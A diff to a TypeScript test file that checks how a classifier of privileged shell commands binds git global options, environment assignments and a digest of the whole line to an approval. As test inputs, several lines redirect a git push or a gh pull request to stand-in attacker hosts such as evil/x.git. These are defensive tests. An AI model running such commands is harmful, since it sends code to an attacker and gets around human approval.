@@ -2,6 +2,7 @@
 // shell line: nothing privileged, the privileged commands it holds, or "could not be read". An unreadable line is never an answer of "nothing privileged".
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
+import { createHash } from 'node:crypto';
 
 import { classifyLine, classifyShellCommand, isUnparseable } from '../../src/domain/privileged-commands.ts';
 import { runUnderShell, shellAvailable } from '../helpers/shell-oracle.ts';
@@ -269,4 +270,76 @@ describe('the differential oracle: every privileged command a shell runs on the 
       }
     });
   }
+});
+
+// ---------------------------------------------------------------------------------------------------------
+// What an approval binds (plan 04-51; CR-03, FR-12, T-04-136): git's global options, the assignments before the program, the whole line.
+// ---------------------------------------------------------------------------------------------------------
+
+const firstOf = (line: string): { action: string; params: Record<string, string> } => {
+  const found = classifyLine(line);
+  assert.equal(found.kind, 'privileged', line);
+  return found.kind === 'privileged' ? (found.commands[0] as { action: string; params: Record<string, string> }) : { action: '', params: {} };
+};
+const lineDigest = (text: string): string => `sha256:${createHash('sha256').update(text).digest('hex').slice(0, 32)}`;
+
+describe('a push redirected by a git global option is not the plain push (CR-03, FR-12, T-04-136)', () => {
+  it('the -c push has other params than the plain push, and names the option words', () => {
+    const plain = firstOf('git push origin main');
+    const redirected = firstOf('git -c remote.origin.url=https://evil/x.git push origin main');
+    assert.notDeepEqual(redirected.params, plain.params, 'the verifier reproduction: equal params for the plain and the -c push');
+    assert.equal(redirected.params['gitOptions'], '-c remote.origin.url=https://evil/x.git');
+    assert.equal(redirected.action, 'git.push');
+    assert.equal(redirected.params['remote'], 'origin');
+    assert.equal(redirected.params['refspec'], 'main');
+    assert.equal(plain.params['gitOptions'], undefined, 'a plain push carries no gitOptions');
+  });
+
+  it('keeps every skipped global option word with its value, verbatim and in order', () => {
+    assert.equal(firstOf('git -C /other push origin main').params['gitOptions'], '-C /other');
+    assert.equal(firstOf('git -C /tmp/x -c user.name=x --no-pager push origin main').params['gitOptions'], '-C /tmp/x -c user.name=x --no-pager');
+    assert.equal(firstOf('git --git-dir=/tmp/x/.git push origin main').params['gitOptions'], '--git-dir=/tmp/x/.git');
+    assert.notDeepEqual(firstOf('git -C /a push origin main').params, firstOf('git -C /b push origin main').params);
+  });
+});
+
+describe('assignments and env options before the program are bound as env (CR-03, FR-12, T-04-136)', () => {
+  it('names the assignment words before the program, in order', () => {
+    assert.equal(firstOf('FOO=1 BAR=2 git push origin main').params['env'], 'FOO=1 BAR=2');
+    assert.equal(firstOf('GIT_SSH_COMMAND=x git push origin main').params['env'], 'GIT_SSH_COMMAND=x');
+    assert.equal(firstOf('git push origin main').params['env'], undefined);
+  });
+
+  it('names the options and assignments an env wrapper is given', () => {
+    assert.equal(firstOf('env -i FOO=1 git push origin main').params['env'], '-i FOO=1');
+    assert.equal(firstOf('A=1 env -u HOME B=2 git push origin main').params['env'], 'A=1 -u HOME B=2');
+  });
+
+  it('every privileged form carries env, not only git', () => {
+    assert.equal(firstOf('GH_REPO=evil/repo gh pr create --base main').params['env'], 'GH_REPO=evil/repo');
+    assert.equal(firstOf('HOME=/x npm publish').params['env'], 'HOME=/x');
+    assert.notDeepEqual(firstOf('GH_REPO=evil/repo gh pr create --base main').params, firstOf('gh pr create --base main').params);
+  });
+});
+
+describe('the line digest binds everything else on the line (CR-03, FR-12, T-04-136)', () => {
+  it('is sha256: and the first 32 hex digits of the SHA-256 of the exact command text, on every privileged command', () => {
+    const text = 'git push origin main';
+    assert.equal(firstOf(text).params['line'], lineDigest(text));
+    assert.match(firstOf(text).params['line'] as string, /^sha256:[0-9a-f]{32}$/);
+    const two = classifyLine('git push a; npm publish');
+    assert.equal(two.kind, 'privileged');
+    if (two.kind === 'privileged') for (const command of two.commands) assert.equal(command.params['line'], lineDigest('git push a; npm publish'));
+  });
+
+  it('another line around the same command is another digest, so an earlier cd or a trailing option cannot ride on the approval', () => {
+    const plain = firstOf('git push origin main').params['line'];
+    assert.notEqual(firstOf('cd /x && git push origin main').params['line'], plain);
+    assert.notEqual(firstOf('git push origin main  ').params['line'], plain, 'the exact text, not a normalized one');
+    assert.notEqual(firstOf('git config remote.origin.url https://evil/x.git; git push origin main').params['line'], plain);
+  });
+
+  it('classifyShellCommand, which sees one command and not the line, adds no line', () => {
+    assert.deepEqual(classifyShellCommand(['git', 'push', 'origin', 'main']), { action: 'git.push', params: { remote: 'origin', refspec: 'main' } });
+  });
 });
